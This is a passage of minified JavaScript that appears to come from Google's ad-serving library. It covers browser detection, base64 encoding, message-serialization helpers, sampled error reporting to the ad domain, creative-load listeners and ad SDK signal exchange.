      return qa ? !!B && 0 < B.brands.length : !1;
    }
    function wa() {
      return F() ? va("Chromium") : (E("Chrome") || E("CriOS")) && !(F() ? 0 : E("Edge")) || E("Silk");
    }
    ;
    var xa = Array.prototype.indexOf ? function (a, b) {
        return Array.prototype.indexOf.call(a, b, void 0);
      } : function (a, b) {
        if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
        for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
        return -1;
      },
      ya = Array.prototype.forEach ? function (a, b) {
        Array.prototype.forEach.call(a, b, void 0);
      } : function (a, b) {
        for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) e in d && b.call(void 0, d[e], e, a);
      };
    function za(a) {
      za[" "](a);
      return a;
    }
    za[" "] = function () {};
    var Aa = F() ? !1 : E("Trident") || E("MSIE");
    !E("Android") || wa();
    wa();
    E("Safari") && (wa() || (F() ? 0 : E("Coast")) || (F() ? 0 : E("Opera")) || (F() ? 0 : E("Edge")) || (F() ? va("Microsoft Edge") : E("Edg/")) || F() && va("Opera"));
    var Ba = {},
      G = null;
    function Ca(a, b) {
      void 0 === b && (b = 0);
      if (!G) {
        G = {};
        for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
          var f = c.concat(d[e].split(""));
          Ba[e] = f;
          for (var g = 0; g < f.length; g++) {
            var h = f[g];
            void 0 === G[h] && (G[h] = g);
          }
        }
      }
      b = Ba[b];
      c = Array(Math.floor(a.length / 3));
      d = b[64] || "";
      for (e = f = 0; f < a.length - 2; f += 3) {
        var k = a[f],
          l = a[f + 1];
        h = a[f + 2];
        g = b[k >> 2];
        k = b[(k & 3) << 4 | l >> 4];
        l = b[(l & 15) << 2 | h >> 6];
        h = b[h & 63];
        c[e++] = g + k + l + h;
      }
      g = 0;
      h = d;
      switch (a.length - f) {
        case 2:
          g = a[f + 1], h = b[(g & 15) << 2] || d;
        case 1:
          a = a[f], c[e] = b[a >> 2] + b[(a & 3) << 4 | g >> 4] + h + d;
      }
      return c.join("");
    }
    ;
    var Da = "undefined" !== typeof Uint8Array,
      Ea = !Aa && "function" === typeof btoa;
    var H = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol() : void 0,
      Fa = H ? function (a, b) {
        a[H] |= b;
      } : function (a, b) {
        void 0 !== a.g ? a.g |= b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ga(a) {
      var b = J(a);
      1 !== (b & 1) && (Object.isFrozen(a) && (a = Array.prototype.slice.call(a)), K(a, b | 1));
    }
    var J = H ? function (a) {
        return a[H] | 0;
      } : function (a) {
        return a.g | 0;
      },
      M = H ? function (a) {
        return a[H];
      } : function (a) {
        return a.g;
      },
      K = H ? function (a, b) {
        a[H] = b;
      } : function (a, b) {
        void 0 !== a.g ? a.g = b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ha() {
      var a = [];
      Fa(a, 1);
      return a;
    }
    function Ia(a) {
      a = a >> 11 & 1023;
      return 0 === a ? 536870912 : a;
    }
    ;
    var Ja = {};
    function N(a) {
      return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
    }
    var Ka,
      O,
      La = [];
    K(La, 39);
    O = Object.freeze(La);
    function Ma(a) {
      if ("boolean" !== typeof a) {
        var b = typeof a;
        throw Error("Expected boolean but got " + ("object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null") + ": " + a);
      }
      return !!a;
    }
    ;
    var Na;
    function P(a, b, c) {
      null == a && (a = Na);
      Na = void 0;
      if (null == a) {
        var d = 96;
        c ? (a = [c], d |= 512) : a = [];
        b && (d = d & -2095105 | (b & 1023) << 11);
      } else {
        if (!Array.isArray(a)) throw Error();
        d = J(a);
        if (d & 64) return a;
        d |= 64;
        if (c && (d |= 512, c !== a[0])) throw Error();
        a: {
          c = a;
          var e = c.length;
          if (e) {
            var f = e - 1,
              g = c[f];
            if (N(g)) {
              d |= 256;
              b = +!!(d & 512) - 1;
              e = f - b;
              1024 <= e && (Oa(c, b, g), e = 1023);
              d = d & -2095105 | (e & 1023) << 11;
              break a;
            }
          }
          b && (g = +!!(d & 512) - 1, b = Math.max(b, e - g), 1024 < b && (Oa(c, g, {}), d |= 256, b = 1023), d = d & -2095105 | (b & 1023) << 11);
        }
      }
      K(a, d);
      return a;
    }
    function Oa(a, b, c) {
      for (var d = 1023 + b, e = a.length, f = d; f < e; f++) {
        var g = a[f];
        null != g && g !== c && (c[f - b] = g);
      }
      a.length = d + 1;
      a[d] = c;
    }
    ;
    function Pa(a, b) {
      return Qa(b);
    }
    function Qa(a) {
      switch (typeof a) {
        case "number":
          return isFinite(a) ? a : String(a);
        case "boolean":
          return a ? 1 : 0;
        case "object":
          if (a && !Array.isArray(a) && Da && null != a && a instanceof Uint8Array) {
            if (Ea) {
              for (var b = "", c = 0, d = a.length - 10240; c < d;) b += String.fromCharCode.apply(null, a.subarray(c, c += 10240));
              b += String.fromCharCode.apply(null, c ? a.subarray(c) : a);
              a = btoa(b);
            } else a = Ca(a);
            return a;
          }
      }
      return a;
    }
    ;
    function Ra(a, b, c, d, e, f) {
      if (null != a) {
        if (Array.isArray(a)) a = e && 0 == a.length && J(a) & 1 ? void 0 : f && J(a) & 2 ? a : Sa(a, b, c, void 0 !== d, e, f);else if (N(a)) {
          var g = {},
            h;
          for (h in a) g[h] = Ra(a[h], b, c, d, e, f);
          a = g;
        } else a = b(a, d);
        return a;
      }
    }
    function Sa(a, b, c, d, e, f) {
      var g = d || c ? J(a) : 0;
      d = d ? !!(g & 32) : void 0;
      a = Array.prototype.slice.call(a);
      for (var h = 0; h < a.length; h++) a[h] = Ra(a[h], b, c, d, e, f);
      c && c(g, a);
      return a;
    }
    function Ta(a) {
      return a.Z === Ja ? a.toJSON() : Qa(a);
    }
    ;
    function Ua(a, b, c) {
      var d = a.l,
        e = M(d);
      if (e & 2) throw Error();
      Va(d, e, b, c);
      return a;
    }
    function Va(a, b, c, d) {
      var e = Ia(b);
      if (c >= e) {
        var f = b;
        if (b & 256) e = a[a.length - 1];else {
          if (null == d) return;
          e = a[e + (+!!(b & 512) - 1)] = {};
          f |= 256;
        }
        e[c] = d;
        f !== b && K(a, f);
      } else a[c + (+!!(b & 512) - 1)] = d, b & 256 && (a = a[a.length - 1], c in a && delete a[c]);
    }
    function Q(a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return Ua(a, b, c);
    }
    ;
    function R(a, b, c) {
      this.l = P(a, b, c);
    }
    R.prototype.toJSON = function () {
      if (Ka) var a = Wa(this, this.l, !1);else a = Sa(this.l, Ta, void 0, void 0, !1, !1), a = Wa(this, a, !0);
      return a;
    };
    function Xa(a) {
      Ka = !0;
      try {
        return JSON.stringify(a.toJSON(), Pa);
      } finally {
        Ka = !1;
      }
    }
    R.prototype.Z = Ja;
    R.prototype.toString = function () {
      return Wa(this, this.l, !1).toString();
    };
    function Wa(a, b, c) {
      var d = a.constructor.aa,
        e = Ia(M(c ? a.l : b)),
        f = !1;
      if (d) {
        if (!c) {
          b = Array.prototype.slice.call(b);
          var g;
          if (b.length && N(g = b[b.length - 1])) for (f = 0; f < d.length; f++) if (d[f] >= e) {
            Object.assign(b[b.length - 1] = {}, g);
            break;
          }
          f = !0;
        }
        e = b;
        c = !c;
        g = M(a.l);
        a = Ia(g);
        g = +!!(g & 512) - 1;
        for (var h, k, l = 0; l < d.length; l++) if (k = d[l], k < a) {
          k += g;
          var n = e[k];
          null == n ? e[k] = c ? O : Ha() : c && n !== O && Ga(n);
        } else h || (n = void 0, e.length && N(n = e[e.length - 1]) ? h = n : e.push(h = {})), n = h[k], null == h[k] ? h[k] = c ? O : Ha() : c && n !== O && Ga(n);
      }
      d = b.length;
      if (!d) return b;
      var p;
      if (N(h = b[d - 1])) {
        a: {
          var q = h;
          e = {};
          c = !1;
          for (var v in q) a = q[v], Array.isArray(a) && a != a && (c = !0), null != a ? e[v] = a : c = !0;
          if (c) {
            for (var t in e) {
              q = e;
              break a;
            }
            q = null;
          }
        }
        q != h && (p = !0);
        d--;
      }
      for (; 0 < d; d--) {
        h = b[d - 1];
        if (null != h) break;
        var y = !0;
      }
      if (!p && !y) return b;
      var w;
      f ? w = b : w = Array.prototype.slice.call(b, 0, d);
      b = w;
      f && (b.length = d);
      q && b.push(q);
      return b;
    }
    ;
    function Ya(a) {
      this.l = P(a);
    }
    u(Ya, R);
    function Za(a, b) {
      this.key = a;
      this.defaultValue = void 0 === b ? !1 : b;
      this.valueType = "boolean";
    }
    ;
    var $a = new Za("100000"),
      ab = new Za("45357156", !0),
      bb = new Za("45350890"),
      cb = new Za("45414892");
    var db = ["A7CQXglZzTrThjGTBEn1rWTxHOEtkWivwzgea+NjyardrwlieSjVuyG44PkYgIPGs8Q9svD8sF3Yedn0BBBjXAkAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="];
    function eb(a, b) {
      return "&adurl=" == a.substring(a.length - 7) ? a.substring(0, a.length - 7) + b + "&adurl=" : a + b;
    }
    ;
    function S(a) {
      return a = void 0 === a ? window : a;
    }
    ;
    var T = x.dicnf || {};
    function fb(a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }
    ;
    function gb(a, b, c) {
      a.addEventListener && a.addEventListener(b, c, !1);
    }
    function hb(a, b, c) {
      a.removeEventListener && a.removeEventListener(b, c, !1);
    }
    ;
    var ib = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
    function jb(a, b, c, d) {
      for (var e = c.length; 0 <= (b = a.indexOf(c, b)) && b < d;) {
        var f = a.charCodeAt(b - 1);
        if (38 == f || 63 == f) if (f = a.charCodeAt(b + e), !f || 61 == f || 38 == f || 35 == f) return b;
        b += e + 1;
      }
      return -1;
    }
    var kb = /#|$/,
      lb = /[?&]($|#)/;
    function mb(a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            za(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    }
    function nb(a, b) {
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? x : c;
      for (var d = 0; c && 40 > d++ && (!b && !mb(c) || !a(c));) a: {
        try {
          var e = c.parent;
          if (e && e != c) {
            c = e;
            break a;
          }
        } catch (f) {}
        c = null;
      }
    }
    function ob() {
      if (!globalThis.crypto) return Math.random();
      try {
        var a = new Uint32Array(1);
        globalThis.crypto.getRandomValues(a);
        return a[0] / 65536 / 65536;
      } catch (b) {
        return Math.random();
      }
    }
    function pb(a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    }
    var qb = [];
    function rb() {
      var a = qb;
      qb = [];
      a = ea(a);
      for (var b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        try {
          b();
        } catch (c) {}
      }
    }
    function sb(a, b) {
      "complete" === a.readyState || "interactive" === a.readyState ? (qb.push(b), 1 == qb.length && (window.Promise ? Promise.resolve().then(rb) : window.setImmediate ? setImmediate(rb) : setTimeout(rb, 0))) : a.addEventListener("DOMContentLoaded", b);
    }
    function tb(a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    }
    ;
    function U(a, b, c, d) {
      ub(x, a, void 0 === b ? null : b, !1, void 0 === c ? !1 : c, void 0 === d ? !1 : d);
    }
    function ub(a, b, c, d, e, f) {
      f = void 0 === f ? !1 : f;
      a.google_image_requests || (a.google_image_requests = []);
      var g = tb("IMG", a.document);
      if (c || e) {
        var h = function (k) {
          c && c(k);
          if (e) {
            k = a.google_image_requests;
            var l = xa(k, g);
            0 <= l && Array.prototype.splice.call(k, l, 1);
          }
          hb(g, "load", h);
          hb(g, "error", h);
        };
        gb(g, "load", h);
        gb(g, "error", h);
      }
      d && (g.referrerPolicy = "no-referrer");
      f && (g.attributionSrc = "");
      g.src = b;
      a.google_image_requests.push(g);
    }
    var vb = fb(function () {
      return "referrerPolicy" in tb("IMG");
    });
    function wb() {
      this.g = {};
    }
    function V(a) {
      xb || (xb = new yb());
      var b = xb.g[a.key];
      if ("proto" === a.valueType) {
        try {
          var c = JSON.parse(b);
          if (Array.isArray(c)) return c;
        } catch (d) {}
        return a.defaultValue;
      }
      return typeof b === typeof a.defaultValue ? b : a.defaultValue;
    }
    ;
    function yb() {
      this.g = {};
      var a = document.currentScript;
      a = (a = (a = void 0 === a ? null : a) && "0" === a.getAttribute("data-jc") ? a : document.querySelector('[data-jc="0"]')) && a.getAttribute("data-jc-flags") || "";
      try {
        var b = JSON.parse(a)[0];
        a = "";
        for (var c = 0; c < b.length; c++) a += String.fromCharCode(b.charCodeAt(c) ^ "\u0003\u0007\u0003\u0007\b\u0004\u0004\u0006\u0005\u0003".charCodeAt(c % 10));
        this.g = JSON.parse(a);
      } catch (d) {}
    }
    var xb;
    u(yb, wb);
    function zb(a, b) {
      var c = void 0 === c ? {} : c;
      this.error = a;
      this.context = b.context;
      this.msg = b.message || "";
      this.id = b.id || "jserror";
      this.meta = c;
    }
    ;
    var Bb = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)");
    function Cb(a, b) {
      this.g = a;
      this.h = b;
    }
    function Db(a, b) {
      this.url = a;
      this.R = !!b;
      this.depth = null;
    }
    ;
    var Eb = null;
    function Fb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
    }
    function Gb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now ? a.now() : null;
    }
    ;
    function Hb(a, b) {
      var c = Gb() || Fb();
      this.label = a;
      this.type = b;
      this.value = c;
      this.duration = 0;
      this.taskId = this.slotId = void 0;
      this.uniqueId = Math.random();
    }
    ;
    var W = x.performance,
      Ib = !!(W && W.mark && W.measure && W.clearMarks),
      X = fb(function () {
        var a;
        if (a = Ib) {
          var b;
          if (null === Eb) {
            Eb = "";
            try {
              a = "";
              try {
                a = x.top.location.hash;
              } catch (c) {
                a = x.location.hash;
              }
              a && (Eb = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
            } catch (c) {}
          }
          b = Eb;
          a = !!b.indexOf && 0 <= b.indexOf("1337");
        }
        return a;
      });
    function Jb() {
      var a = window;
      this.h = [];
      this.i = a || x;
      var b = null;
      a && (a.google_js_reporting_queue = a.google_js_reporting_queue || [], this.h = a.google_js_reporting_queue, b = a.google_measure_js_timing);
      this.g = X() || (null != b ? b : 1 > Math.random());
    }
    function Kb(a) {
      a && W && X() && (W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
    }
    Jb.prototype.start = function (a, b) {
      if (!this.g) return null;
      a = new Hb(a, b);
      b = "goog_" + a.label + "_" + a.uniqueId + "_start";
      W && X() && W.mark(b);
      return a;
    };
    Jb.prototype.end = function (a) {
      if (this.g && "number" === typeof a.value) {
        a.duration = (Gb() || Fb()) - a.value;
        var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
        W && X() && W.mark(b);
        !this.g || 2048 < this.h.length || this.h.push(a);
      }
    };
    function Lb() {
      this.i = "&";
      this.h = {};
      this.j = 0;
      this.g = [];
    }
    function Mb(a, b) {
      var c = {};
      c[a] = b;
      return [c];
    }
    function Nb(a, b, c, d, e) {
      var f = [];
      pb(a, function (g, h) {
        (g = Ob(g, b, c, d, e)) && f.push(h + "=" + g);
      });
      return f.join(b);
    }
    function Ob(a, b, c, d, e) {
      if (null == a) return "";
      b = b || "&";
      c = c || ",$";
      "string" == typeof c && (c = c.split(""));
      if (a instanceof Array) {
        if (d = d || 0, d < c.length) {
          for (var f = [], g = 0; g < a.length; g++) f.push(Ob(a[g], b, c, d + 1, e));
          return f.join(c[d]);
        }
      } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nb(a, b, c, d, e + 1)) : "...";
      return encodeURIComponent(String(a));
    }
    function Pb(a, b) {
      var c = "https://pagead2.googlesyndication.com" + b,
        d = Qb(a) - b.length;
      if (0 > d) return "";
      a.g.sort(function (n, p) {
        return n - p;
      });
      b = null;
      for (var e = "", f = 0; f < a.g.length; f++) for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
        if (!d) {
          b = null == b ? g : b;
          break;
        }
        var l = Nb(h[k], a.i, ",$");
        if (l) {
          l = e + l;
          if (d >= l.length) {
            d -= l.length;
            c += l;
            e = a.i;
            break;
          }
          b = null == b ? g : b;
        }
      }
      a = "";
      null != b && (a = e + "trn=" + b);
      return c + a;
    }
    function Qb(a) {
      var b = 1,
        c;
      for (c in a.h) b = c.length > b ? c.length : b;
      return 3997 - b - a.i.length - 1;
    }
    ;
    function Rb() {
      var a = Sb;
      this.m = Tb;
      this.g = void 0 === a ? null : a;
      this.h = null;
      this.i = !1;
      this.o = this.j;
    }
    function Ub(a) {
      var b = Vb;
      try {
        if (b.g && b.g.g) {
          var c = b.g.start(903 .toString(), 3);
          var d = a();
          b.g.end(c);
        } else d = a();
      } catch (g) {
        a = !0;
        try {
          Kb(c), a = b.o(903, new zb(g, {
            message: Wb(g)
          }), void 0, void 0);
        } catch (h) {
          b.j(217, h);
        }
        if (a) {
          var e, f;
          null == (e = window.console) || null == (f = e.error) || f.call(e, g);
        } else throw g;
      }
      return d;
    }
    function Xb(a) {
      return function () {
        var b = pa.apply(0, arguments);
        return Ub(function () {
          return a.apply(void 0, b);
        });
      };
    }
    Rb.prototype.j = function (a, b, c, d, e) {
      e = e || "jserror";
      try {
        var f = new Lb();
        f.g.push(1);
        f.h[1] = Mb("context", a);
        b.error && b.meta && b.id || (b = new zb(b, {
          message: Wb(b)
        }));
        if (b.msg) {
          var g = b.msg.substring(0, 512);
          f.g.push(2);
          f.h[2] = Mb("msg", g);
        }
        var h = b.meta || {};
        if (this.h) try {
          this.h(h);
        } catch (ja) {}
        if (d) try {
          d(h);
        } catch (ja) {}
        b = [h];
        f.g.push(3);
        f.h[3] = b;
        d = x;
        b = [];
        g = null;
        do {
          var k = d;
          if (mb(k)) {
            var l = k.location.href;
            g = k.document && k.document.referrer || null;
          } else l = g, g = null;
          b.push(new Db(l || ""));
          try {
            d = k.parent;
          } catch (ja) {
            d = null;
          }
        } while (d && k != d);
        l = 0;
        for (var n = b.length - 1; l <= n; ++l) b[l].depth = n - l;
        k = x;
        if (k.location && k.location.ancestorOrigins && k.location.ancestorOrigins.length == b.length - 1) for (n = 1; n < b.length; ++n) {
          var p = b[n];
          p.url || (p.url = k.location.ancestorOrigins[n - 1] || "", p.R = !0);
        }
        var q = new Db(x.location.href, !1);
        k = null;
        var v = b.length - 1;
        for (p = v; 0 <= p; --p) {
          var t = b[p];
          !k && Bb.test(t.url) && (k = t);
          if (t.url && !t.R) {
            q = t;
            break;
          }
        }
        t = null;
        var y = b.length && b[v].url;
        0 != q.depth && y && (t = b[v]);
        var w = new Cb(q, t);
        if (w.h) {
          var r = w.h.url || "";
          f.g.push(4);
          f.h[4] = Mb("top", r);
        }
        var I = {
          url: w.g.url || ""
        };
        if (w.g.url) {
          var L = w.g.url.match(ib),
            C = L[1],
            D = L[3],
            ka = L[4];
          q = "";
          C && (q += C + ":");
          D && (q += "//", q += D, ka && (q += ":" + ka));
          var Ab = q;
        } else Ab = "";
        I = [I, {
          url: Ab
        }];
        f.g.push(5);
        f.h[5] = I;
        Yb(this.m, e, f, this.i, c);
      } catch (ja) {
        try {
          Yb(this.m, e, {
            context: "ecmserr",
            rctx: a,
            msg: Wb(ja),
            url: w && w.g.url
          }, this.i, c);
        } catch (id) {}
      }
      return !0;
    };
    function Wb(a) {
      var b = a.toString();
      a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
      a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
      if (a.stack) {
        a = a.stack;
        var c = b;
        try {
          -1 == a.indexOf(c) && (a = c + "\n" + a);
          for (var d; a != d;) d = a, a = a.replace(RegExp("((https?:/..*/)[^/:]*:\\d+(?:.|\n)*)\\2"), "$1");
          b = a.replace(RegExp("\n *", "g"), "\n");
        } catch (e) {
          b = c;
        }
      }
      return b;
    }
    ;
    function Zb(a) {
      var b = "J";
      if (a.J && a.hasOwnProperty(b)) return a.J;
      b = new a();
      return a.J = b;
    }
    ;
    function $b() {}
    ;
    function ac() {
      this.g = Math.random();
    }
    function bc() {
      var a = Tb,
        b = window.google_srt;
      0 <= b && 1 >= b && (a.g = b);
    }
    function Yb(a, b, c, d, e) {
      if (((void 0 === d ? 0 : d) ? a.g : Math.random()) < (e || .01)) try {
        if (c instanceof Lb) var f = c;else f = new Lb(), pb(c, function (h, k) {
          var l = f,
            n = l.j++;
          h = Mb(k, h);
          l.g.push(n);
          l.h[n] = h;
        });
        var g = Pb(f, "/pagead/gen_204?id=" + b + "&");
        g && U(g);
      } catch (h) {}
    }
    ;
    var Tb,
      Vb,
      Sb = new Jb();
    function cc() {
      if (!window.google_measure_js_timing) {
        var a = Sb;
        a.g = !1;
        a.h != a.i.google_js_reporting_queue && (X() && ya(a.h, Kb), a.h.length = 0);
      }
    }
    (function (a) {
      Tb = null != a ? a : new ac();
      "number" !== typeof window.google_srt && (window.google_srt = Math.random());
      bc();
      Vb = new Rb();
      Vb.h = function () {};
      Vb.i = !0;
      "complete" == window.document.readyState ? cc() : Sb.g && gb(window, "load", function () {
        cc();
      });
    })();
    var dc = ["FRAME", "IMG", "IFRAME"],
      ec = /^[01](px)?$/;
    function fc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function gc(a, b, c, d, e, f, g) {
      c = void 0 === c ? !0 : c;
      d = void 0 === d ? !1 : d;
      f = void 0 === f ? !1 : f;
      g = void 0 === g ? !1 : g;
      if (a = fc(a)) {
        e || (e = function (C, D, ka) {
          C.addEventListener(D, ka);
        });
        for (var h = !1, k = function (C) {
            h || (h = !0, b(C));
          }, l, n, p = 0; p < dc.length; ++p) if (dc[p] == a.tagName) {
          n = 3;
          l = [a];
          break;
        }
        l || (l = a.querySelectorAll(dc.join(",")), n = 2);
        var q = 0,
          v = 0,
          t = !g,
          y = a = !1;
        p = {};
        for (var w = 0; w < l.length; p = {
          v: p.v
        }, w++) {
          var r = l[w];
          if (!("IMG" == r.tagName && (r.complete && (!r.naturalWidth || !r.naturalHeight) || (void 0 === g ? 0 : g) && r.style && "none" === r.style.display) || ec.test(r.getAttribute("width")) && ec.test(r.getAttribute("height")))) {
            p.v = "IMG" === r.tagName;
            if ("IMG" == r.tagName) var I = r.naturalWidth && r.naturalHeight ? !0 : !1;else try {
              I = "complete" === (r.readyState ? r.readyState : r.contentWindow && r.contentWindow.document && r.contentWindow.document.readyState) ? !0 : !1;
            } catch (C) {
              I = void 0 === d ? !1 : d;
            }
            if (I) a = !0, p.v && (t = !0);else {
              q++;
              var L = function (C) {
                return function (D) {
                  q--;
                  !q && t && k(n);
                  C.v && (D = D && "error" === D.type, v--, D || (t = !0), !v && y && t && k(n));
                };
              }(p);
              e(r, "load", L);
              p.v && (v++, e(r, "error", L));
            }
          }
        }
        0 === v && (t = !0);
        l = null;
        if (0 === q && !a && "complete" === x.document.readyState) n = 5;else if (q || !a) {
          e(x, "load", function () {
            !f || !v && t ? k(4) : y = !0;
          });
          return;
        }
        c && k(n);
      }
    }
    ;
    function hc(a, b, c) {
      if (a) for (var d = 0; null != a && 500 > d && !c(a); ++d) a = b(a);
    }
    function ic(a, b) {
      hc(a, function (c) {
        try {
          return c === c.parent ? null : c.parent;
        } catch (d) {}
        return null;
      }, b);
    }
    function jc(a, b) {
      if ("IFRAME" == a.tagName) b(a);else {
        a = a.querySelectorAll("IFRAME");
        for (var c = 0; c < a.length && !b(a[c]); ++c);
      }
    }
    function kc(a) {
      return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
    }
    function lc(a, b, c) {
      try {
        var d = JSON.parse(c.data);
      } catch (g) {}
      if ("object" === typeof d && d && "creativeLoad" === d.type) {
        var e = kc(a);
        if (c.source && e) {
          var f;
          ic(c.source, function (g) {
            try {
              if (g.parent === e) return f = g, !0;
            } catch (h) {}
          });
          f && jc(a, function (g) {
            if (g.contentWindow === f) return b(d), !0;
          });
        }
      }
    }
    function mc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function nc(a, b) {
      var c = mc(a);
      if (c) if (c.onCreativeLoad) c.onCreativeLoad(b);else {
        var d = b ? [b] : [],
          e = function (f) {
            for (var g = 0; g < d.length; ++g) try {
              d[g](1, f);
            } catch (h) {}
            d = {
              push: function (h) {
                h(1, f);
              }
            };
          };
        c.onCreativeLoad = function (f) {
          d.push(f);
        };
        c.setAttribute("data-creative-load-listener", "");
        c.addEventListener("creativeLoad", function (f) {
          e(f.detail);
        });
        x.addEventListener("message", function (f) {
          lc(c, e, f);
        });
      }
    }
    ;
    function Y(a) {
      var b = this;
      this.h = !1;
      this.g = [];
      a(function (c) {
        oc(b, c);
      });
    }
    function oc(a, b) {
      if (!a.h) if (b instanceof Y) b.then(function (c) {
        oc(a, c);
      });else {
        a.h = !0;
        a.i = b;
        for (b = 0; b < a.g.length; ++b) pc(a, a.g[b]);
        a.g = [];
      }
    }
    function pc(a, b) {
      a.h ? b(a.i) : a.g.push(b);
    }
    Y.prototype.then = function (a) {
      var b = this;
      return new Y(function (c) {
        pc(b, function (d) {
          c(a(d));
        });
      });
    };
    function qc(a) {
      var b = a.length,
        c = 0;
      return new Y(function (d) {
        if (0 == b) d([]);else for (var e = [], f = {
            s: 0
          }; f.s < b; f = {
          s: f.s
        }, ++f.s) a[f.s].then(function (g) {
          return function (h) {
            e[g.s] = h;
            ++c == b && d(e);
          };
        }(f));
      });
    }
    function rc() {
      var a,
        b = new Y(function (c) {
          a = c;
        });
      return new sc(b, a);
    }
    function sc(a, b) {
      this.promise = a;
      this.resolve = b;
    }
    ;
    function tc(a) {
      return a.prerendering ? 3 : {
        visible: 1,
        hidden: 2,
        prerender: 3,
        preview: 4,
        unloaded: 5
      }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0;
    }
    function uc(a) {
      var b;
      a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
      return b;
    }
    ;
    function vc(a, b, c) {
      function d(k) {
        try {
          var l = "object" === typeof k.data ? k.data : JSON.parse(k.data);
          g === l.paw_id && (window.clearTimeout(h), window.removeEventListener("message", d), l.signal ? b(l.signal) : l.error && c(l.error));
        } catch (n) {
          k = {
            msg: "postmessageError",
            err: n instanceof Error ? n.message : "nonError",
            data: null == k.data ? "null" : 500 < k.data.length ? k.data.substring(0, 500) : k.data
          }, Zb($b), l = [], !k.eid && l.length && (k.eid = l.toString()), Yb(Tb, "paw_sigs", k, !0);
        }
      }
      var e = {},
        f = 200;
      e = void 0 === e ? {} : e;
      b = void 0 === b ? function () {} : b;
      c = void 0 === c ? function () {} : c;
      f = void 0 === f ? 200 : f;
      var g = String(Math.floor(2147483647 * ob())),
        h = 0;
      window.addEventListener("message", function (k) {
        Xb(function () {
          d(k);
        })();
      });
      a.postMessage(Object.assign({}, {
        paw_id: g
      }, e));
      h = window.setTimeout(function () {
        window.removeEventListener("message", d);
        c("PAW GMA postmessage timed out.");
      }, f);
    }
    function wc() {
      var a = window,
        b,
        c;
      if (a.gmaSdk || (null == (b = a.webkit) ? 0 : null == (c = b.messageHandlers) ? 0 : c.getGmaViewSignals)) return a;
      try {
        var d = window.parent,
          e,
          f;
        if (d.gmaSdk || (null == (e = d.webkit) ? 0 : null == (f = e.messageHandlers) ? 0 : f.getGmaViewSignals)) return d;
      } catch (g) {}
      return null;
    }
    ;
    function xc(a) {
      this.l = P(a);
    }
    u(xc, R);
    function yc(a) {
      this.l = P(a);
    }
    u(yc, R);
    function zc(a, b) {
      return Q(a, 2, b);
    }
    function Ac(a, b) {
      return Q(a, 3, b);
    }
    function Bc(a, b) {
      return Q(a, 4, b);
    }
    function Cc(a, b) {
      return Q(a, 5, b);
    }
    function Dc(a, b) {
      return Q(a, 9, b);
    }
    function Ec(a, b) {
      var c = b;
      b = a.l;
      var d = M(b);
      if (d & 2) throw Error();
      if (null != c) {
        for (var e = !!c.length, f = 0; f < c.length; f++) {
          var g = c[f];
          e = e && !(J(g.l) & 2);
        }
        g = J(c);
        f = g | 1;
        f = (e ? f | 8 : f & -9) | 4;
        f != g && (Object.isFrozen(c) && (c = Array.prototype.slice.call(c)), K(c, f));
      }
      null == c && (c = void 0);
      Va(b, d, 10, c);
      return a;
    }
    function Fc(a, b) {
      return Ua(a, 11, null == b ? b : Ma(b));
    }
    function Gc(a, b) {
      return Q(a, 1, b);
    }
    function Hc(a, b) {
      return Ua(a, 7, null == b ? b : Ma(b));
    }
    yc.aa = [10, 6];
    var Ic = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
    function Jc(a) {
      var b;
